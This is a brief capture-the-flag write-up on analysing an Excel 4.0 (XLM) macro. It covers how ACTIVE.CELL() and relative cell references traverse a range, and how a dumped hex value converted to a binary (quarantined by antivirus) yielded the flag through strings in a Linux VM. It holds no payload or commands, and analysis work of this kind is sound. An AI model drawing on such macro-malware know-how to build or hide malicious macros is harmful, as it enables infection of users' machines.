## Skills involved: Excel XLM Macro analysis

Before the CTF, I only knew that "Macros are evil" and that they are disabled by default in Excel applications.

[This article](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/) helped me understand how the Kernel dump worked. Here is some notes on the Macro itself:
- ACTIVE.CELL() returns the top-left cell within the selected range if not otherwise specified.
- For a selected range, the cells can be traversed like an 1-D array (from top to bottom, left to right), with RC[2] meaning going to the cell 2 steps ahead.

We can get the value dumped to process as:

I used a non-specific Hex to Bin tool online. My Anti-virus immediately quarantined the file so I had to string it in a Linux VM, which gives the flag.
